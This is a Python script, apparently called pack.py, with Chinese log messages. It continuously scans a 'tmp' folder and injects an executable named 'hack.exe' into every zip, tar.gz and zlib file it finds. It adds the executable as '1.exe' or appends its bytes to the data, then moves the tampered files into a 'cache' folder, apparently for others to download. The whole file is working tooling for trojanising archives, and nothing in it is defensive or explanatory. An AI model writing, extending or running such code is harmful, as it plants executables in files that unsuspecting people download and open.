import os
import time
import shutil
import zipfile
import tarfile
import gzip
import bz2
import zlib

tmp_root = "tmp"
cache_root = "cache"
exe_path = os.path.join("exe", "hack.exe")

def detect_file_type(filepath):
    with open(filepath, "rb") as f:
        header = f.read(4)
    if header.startswith(b"PK\x03\x04"):
        return "zip"
    elif header.startswith(b"\x1f\x8b"):
        return "gz"
    elif header.startswith(b"BZh"):
        return "bz2"
    elif header.startswith(b"\x78\x9C"):
        return "zlib"
    else:
        return "other"

def inject_zip(zip_path):
    with zipfile.ZipFile(zip_path, 'a') as zipf:
        zipf.write(exe_path, arcname="1.exe")
    return True

def inject_gz(gz_path):
    base = os.path.splitext(gz_path)[0]
    try:
        with gzip.open(gz_path, "rb") as f_in:
            content = f_in.read()
        tmp_tar_path = base + ".tar"
        with open(tmp_tar_path, "wb") as f_out:
            f_out.write(content)

        with tarfile.open(tmp_tar_path, "a") as tar:
            tar.add(exe_path, arcname="1.exe")

        with open(tmp_tar_path, "rb") as f_in:
            with gzip.open(gz_path, "wb") as f_out:
                shutil.copyfileobj(f_in, f_out)
        os.remove(tmp_tar_path)
        return True
    except Exception as e:
        print(f"[!] 注入 .gz 失败: {gz_path}, {e}")
        return False

def inject_bz2(bz2_path):
    print(f"[!] bz2 格式无法注入（只拷贝）: {bz2_path}")
    return False

def inject_zlib(zlib_path):
    try:
        with open(zlib_path, "rb") as f:
            data = f.read()
        decompressed = zlib.decompress(data)

        with open(exe_path, "rb") as f:
            exe_data = f.read()

        new_data = decompressed + exe_data
        recompressed = zlib.compress(new_data)

        with open(zlib_path, "wb") as f:
            f.write(recompressed)

        print(f"[+] 已注入到 zlib 文件: {zlib_path}")
        return True
    except Exception as e:
        print(f"[!] 注入 zlib 失败: {zlib_path}, {e}")
        return False

def process_file(abs_path):
    rel_path = os.path.relpath(abs_path, tmp_root)
    dst_path = os.path.join(cache_root, rel_path)
    os.makedirs(os.path.dirname(dst_path), exist_ok=True)

    filetype = detect_file_type(abs_path)
    print(f"[+] 处理文件: {rel_path} 类型: {filetype}")

    try:
        if filetype == "zip":
            inject_zip(abs_path)
        elif filetype == "gz":
            inject_gz(abs_path)
        elif filetype == "bz2":
            inject_bz2(abs_path)
        elif filetype == "zlib":
            inject_zlib(abs_path)
        else:
            print(f"[-] 不注入: {rel_path}")

        shutil.move(abs_path, dst_path)
        print(f"[✔] 移动到缓存: {dst_path}")
    except Exception as e:
        print(f"[!] 处理失败: {rel_path}, {e}")

def scan_tmp_dir():
    for root, dirs, files in os.walk(tmp_root):
        for name in files:
            full_path = os.path.join(root, name)
            try:
                process_file(full_path)
            except Exception as e:
                print(f"[!] 处理异常: {full_path}, {e}")

if __name__ == "__main__":
    print("📦 pack.py 开始监控 tmp 目录...")
    while True:
        scan_tmp_dir()
        time.sleep(5)
